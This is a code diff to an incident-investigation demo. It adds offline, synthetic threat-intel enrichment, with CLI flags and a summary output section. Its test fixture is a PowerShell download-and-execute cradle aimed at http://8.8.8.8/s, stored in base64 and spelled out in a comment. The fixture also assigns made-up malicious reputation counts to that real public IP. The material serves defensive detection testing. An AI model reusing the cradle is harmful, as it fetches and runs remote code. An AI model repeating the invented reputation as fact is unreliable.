@@ -122,10 +122,23 @@ from investigator.tools.base64_decoder import (
     decode_powershell_base64,
 )
 from investigator.tools.mitre_mapper import map_detection_to_mitre
+from investigator.ioc_extractor import extract_candidate_public_ips
+from investigator.threat_intel import (
+    FakeThreatIntelClient,
+    ThreatIntelLookupStatus,
+    ThreatIntelPolicySignal,
+    ThreatIntelResult,
+    ThreatIntelSignalStatus,
+    enrich_threat_intel as _enrich_threat_intel,
+)
 
 
+# Synthetic critical payload: IEX (New-Object Net.WebClient).DownloadString("http://8.8.8.8/s")
+# Contains a valid globally-routable public IP (8.8.8.8) so that the IOC extractor
+# can surface it for FakeThreatIntelClient enrichment in --enrich-threat-intel mode.
+# IMPORTANT: 8.8.8.8 reputation data below is 100% SYNTHETIC FAKE-TI for demo purposes.
 SYNTHETIC_CRITICAL_PAYLOAD_B64 = (
-    "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AcwAiACkA"
+    "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AOAAuADgALgA4AC4AOAAvAHMAIgApAA=="
 )
 
 
@@ -280,6 +293,7 @@ def _render_safe_summary(
     persisted_path: Optional[Path] = None,
     written_incident_path: Optional[Path] = None,
     ticket_result: Optional[TicketResult] = None,
+    ti_signal: Optional[ThreatIntelPolicySignal] = None,
 ) -> None:
     """Render structured, safe demo metadata without secrets or unbounded payloads."""
     stream.write("\n" + "=" * 64 + "\n")
@@ -316,6 +330,15 @@ def _render_safe_summary(
     stream.write(f"  Proposed Action:   {decision.proposed_action.value}\n")
     stream.write(f"  Approval Required: {'yes' if decision.requires_human_approval else 'no'}\n")
     stream.write(f"  Policy Reasons:    {', '.join(decision.reasons)}\n")
+
+    if ti_signal is not None:
+        stream.write("\n[3b. THREAT INTEL ENRICHMENT (SYNTHETIC FAKE-TI -- NO REAL REPUTATION CLAIM)]\n")
+        stream.write(f"  TI Status:         {ti_signal.status.value}\n")
+        if ti_signal.indicator is not None:
+            stream.write(f"  TI Indicator:      {ti_signal.indicator} [SYNTHETIC FAKE-TI ONLY]\n")
+        stream.write(f"  Malicious Count:   {ti_signal.malicious_count} [SYNTHETIC]\n")
+        stream.write(f"  Suspicious Count:  {ti_signal.suspicious_count} [SYNTHETIC]\n")
+        stream.write(f"  TI Detail:         {ti_signal.detail_code}\n")
 
     stream.write("\n[4. HUMAN APPROVAL & SIMULATION OUTCOME]\n")
     if approval_record is not None:
@@ -386,6 +409,8 @@ def run_demo(
     incidents_dir: Optional[Path] = None,
     kill_switch: bool = False,
     guard: Optional[RuntimeGuard] = None,
+    enrich_threat_intel: bool = False,
+    threat_intel_provider: str = "fake",
 ) -> int:
     """Execute the end-to-end integration demo workflow.
 
@@ -570,6 +595,71 @@ def run_demo(
         return 1
 
     # -----------------------------------------------------------------------
+    # Step 3.5: Optional Threat-Intel Enrichment (between investigation and policy)
+    # -----------------------------------------------------------------------
+    ti_signal: Optional[ThreatIntelPolicySignal] = None
+    if enrich_threat_intel:
+        candidate_ip = extract_candidate_public_ips(
+            alert=incident,
+            deterministic_decoded_command=deterministic_decoded,
+        )
+        out_stream.write(
+            f"[*] TI enrichment: candidate IP = {candidate_ip!r} "
+            f"[SYNTHETIC FAKE-TI -- NO REAL REPUTATION CLAIM]\n"
+        )
+        out_stream.flush()
+
+        if threat_intel_provider == "fake" or threat_intel_provider is None:
+            # Synthetic FakeThreatIntelClient: returns high malicious_count for 8.8.8.8
+            # to demonstrate TI -> CRITICAL policy escalation path.
+            # This is entirely synthetic lab data.
+            fake_fixtures: dict = {}
+            if candidate_ip is not None:
+                try:
+                    fake_result = ThreatIntelResult(
+                        provider="fake_threat_intel",
+                        indicator_type="ip",
+                        indicator_value=candidate_ip,
+                        lookup_status=ThreatIntelLookupStatus.FOUND,
+                        malicious_count=7,
+                        suspicious_count=2,
+                        harmless_count=40,
+                        undetected_count=5,
+                        detail_code="ip_lookup_found",
+                        last_analysis_utc="2026-09-17T12:00:00Z",
+                    )
+                    fake_fixtures[candidate_ip] = fake_result
+                except Exception:
+                    pass  # no fixture; NOT_FOUND will result
+            ti_client = FakeThreatIntelClient(fixtures=fake_fixtures)
+        else:
+            out_stream.write(f"[!] Unknown threat-intel provider: {threat_intel_provider!r}\n")
+            return 1
+
+        try:
+            ti_signal = _enrich_threat_intel(
+                canonical_ip=candidate_ip,
+                client=ti_client,
+                runtime_guard=runtime_guard,
+                audit_log=audit_log,
+                incident_id=incident.incident_id,
+            )
+        except RuntimeHaltError:
+            # RuntimeGuard halted at THREAT_INTEL checkpoint.
+            # Global execution abort: do NOT continue to policy, approval,
+            # simulation, incident persistence, or ticketing.
+            # The RuntimeGuard RUNTIME_HALTED audit event is already authoritative.
+            out_stream.write("[!] runtime_guard_halted_during_ti_enrichment\n")
+            return 1
+        out_stream.write(
+            f"[*] TI signal: status={ti_signal.status.value}  "
+            f"malicious={ti_signal.malicious_count}  "
+            f"suspicious={ti_signal.suspicious_count}  "
+            f"[SYNTHETIC FAKE-TI ONLY]\n"
+        )
+        out_stream.flush()
+
+    # -----------------------------------------------------------------------
     # Step 4: Deterministic Policy Evaluation (Trusted Authority)
     # -----------------------------------------------------------------------
     policy_context = PolicyContext(
@@ -578,6 +668,7 @@ def run_demo(
         deterministic_decoded_command=deterministic_decoded,
         mitre_technique_id=mitre_id,
         tool_failure_or_incomplete_evidence=tool_failure,
+        threat_intel=ti_signal,
     )
 
     policy_engine = RiskPolicyEngine()
@@ -755,6 +846,7 @@ def run_demo(
         persisted_path=target_audit_path,
         written_incident_path=written_incident_path,
         ticket_result=ticket_result,
+        ti_signal=ti_signal,
     )
 
     return 0
@@ -822,6 +914,21 @@ def main() -> int:
         default=False,
         help="Engage runtime kill switch to abort execution at preflight.",
     )
+    parser.add_argument(
+        "--enrich-threat-intel",
+        action="store_true",
+        default=False,
+        help=(
+            "Enable offline FakeThreatIntelClient enrichment between investigation and policy. "
+            "Uses synthetic lab data only -- no live VT calls. Default: disabled."
+        ),
+    )
+    parser.add_argument(
+        "--threat-intel-provider",
+        choices=["fake"],
+        default="fake",
+        help="Threat-intel provider for --enrich-threat-intel (only 'fake' is supported in this milestone).",
+    )
 
     args = parser.parse_args()
 
@@ -858,6 +965,8 @@ def main() -> int:
         jira_project=args.jira_project,
         jira_issue_type=args.jira_issue_type,
         kill_switch=args.kill_switch,
+        enrich_threat_intel=args.enrich_threat_intel,
+        threat_intel_provider=args.threat_intel_provider,
     )
 
 
